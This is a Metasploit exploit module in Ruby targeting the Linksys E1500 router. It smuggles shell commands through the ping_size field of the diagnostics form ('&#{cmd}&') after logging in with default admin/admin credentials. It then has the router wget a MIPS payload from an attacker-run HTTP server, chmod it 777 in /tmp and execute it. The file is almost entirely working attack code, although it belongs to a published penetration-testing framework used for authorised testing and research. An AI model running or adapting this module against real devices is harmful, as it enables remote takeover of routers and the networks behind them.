##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Linksys E1500 Command Execution - Upload and Execute',
			'Description' => %q{
					This module can be used to execute a payload on Linksys Routers
			},
			'Author'      => [ 'Michael Messner <devnull@s3cur1ty.de>'],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'BID', '57760' ],
					[ 'EDB', '24475' ],
					[ 'OSVDB', '89912' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ]
				],
			'DisclosureDate' => 'Feb 05 2013',
			'Privileged'  => true,
			'Platform'       => ['linux','unix'],
			#'Arch'           => ARCH_MIPSLE,
			'Payload'        =>
				{
					'DisableNops' => true
				},
			'Targets'        =>
			[
				[ 'CMD',
					{
					'Arch' => ARCH_CMD,
					'Platform' => 'unix'
					}
				],
				[ 'Linux Mipsel Payload',
					{
					'Arch' => ARCH_MIPSLE,
					'Platform' => 'linux'
					}
				],
			],
			'DefaultTarget'  => 1,
			))

		register_options(
			[
				OptString.new('USERNAME', [ true, 'The username to authenticate as', 'admin' ]),
				OptString.new('PASSWORD', [ true, 'The password for the specified username', 'admin' ]),
				OptString.new('DOWNHOST',  [ false, 'The host to request the MIPS payload from' ]),
				OptString.new('DOWNFILE',  [ false, 'Filename to download, (default: random)' ]),
				OptString.new('SRVHOST',  [ true, 'The local host to listen on. This must be an address on the local machine (do not use 0.0.0.0)' ]),
			], self.class)
	end


	def request(cmd,user,pass,uri)
		begin
			res = send_request_cgi({
				'uri'    => uri,
				'method' => 'POST',
				'authorization' => basic_auth(user,pass),
				'vars_post' => {
					"submit_button" => "Diagnostics",
					"change_action" => "gozila_cgi",
					"submit_type" => "start_ping",
					"action" => "",
					"commit" => "0",
					"ping_ip" => "1.1.1.1",
					"ping_size" => "&#{cmd}&",
					"ping_times" => "5",
					"traceroute_ip" => ""
				}
			})

			return res

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return nil
		end
	end

	def exploit
		downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
		uri = '/apply.cgi'
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']
		rhost = datastore['RHOST']
		rport = datastore['RPORT']

		#
		# testing Login
		#

		print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		begin
			res = send_request_cgi({
				'uri'     => uri,
				'method'  => 'GET',
				'authorization' => basic_auth(user,pass)
				})

			return if res.nil?
			return if (res.code == 404)

			if [200, 301, 302].include?(res.code)
				print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
			else
				print_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
				return
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return
		end

		if target.name =~ /CMD/
			if not (datastore['CMD'])
				fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
			end
			cmd = payload.encoded
			res = request(cmd,user,pass,uri)
			if (!res)
				fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
			end
			return
		end


		#thx to Juan for his awesome work on the mipsel payloads
		@pl = generate_payload_exe

		#
		# start our server
		#
		resource_uri = '/' + downfile

		if (datastore['DOWNHOST'])
			service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
		else
			#do not use SSL ;)
			if datastore['SSL']
				ssl_restore = true
				datastore['SSL'] = false
			end

			service_url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
			print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
			start_service({'Uri' => {
				'Proc' => Proc.new { |cli, req|
					on_request_uri(cli, req)
				},
				'Path' => resource_uri
			}})

			datastore['SSL'] = true if ssl_restore
		end

		print_status("#{rhost}:#{rport} - Asking the Linksys device to download #{service_url}")

		#this filename is used to store the payload on the device
		filename = rand_text_alpha_lower(8)

		#not working if we send all command together -> lets take three requests
		cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"

		res = request(cmd,user,pass,uri)
		if (!res)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
		end
		register_file_for_cleanup("/tmp/#{filename}")

		#
		# chmod
		#

		cmd = "chmod 777 /tmp/#{filename}"

		print_status("#{rhost}:#{rport} - Asking the Linksys device to prepare #{downfile}")

		res = request(cmd,user,pass,uri)
		if (!res)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
		end


		#
		# execute
		#

		cmd = "/tmp/#{filename}"

		print_status("#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}")

		res = request(cmd,user,pass,uri)
		if (!res)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
		end

	end


#	# Handle incoming requests from the server
	def on_request_uri(cli, request)

		#print_status("on_request_uri called: #{request.inspect}")
		if (not @pl)
			print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
			return
		end

		print_status("#{rhost}:#{rport} - Sending the payload to the server...")
		send_response(cli, @pl)
	end

end
